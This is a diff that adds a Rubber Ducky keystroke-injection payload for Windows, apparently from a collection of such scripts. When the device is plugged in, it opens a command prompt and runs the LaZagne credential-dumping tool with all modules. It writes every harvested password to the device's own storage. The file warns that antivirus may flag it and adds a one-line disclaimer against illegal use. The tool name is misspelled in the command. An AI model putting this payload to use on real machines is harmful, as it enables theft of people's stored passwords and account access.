@@ -1,0 +1,13 @@
+REM Runs LaZagene executable stored on Rubber Ducky (Windows)
+REM AUTHOR Crashwire
+REM DESCRIPTION: Utilizes cmd to run LaZagne.exe stored on the D: Drive (Rubber Ducky) and output results to D: Drive. Download .exe from 
+REM https://github.com/AlessandroZ/LaZagne/releases/tag/v2.4.6 **May trigger AV**
+REM **DO NOT USE FOR ILLEGAL PURPOSES**
+ATTACKMODE HID STORAGE
+DELAY 1000
+GUI r
+DELAY 200
+STRING cmd /c "D: && LaZange.exe all -vv -oN -output D:\lazagne_output.txt"
+ENTER
+DELAY 200
+STRINGLN exit
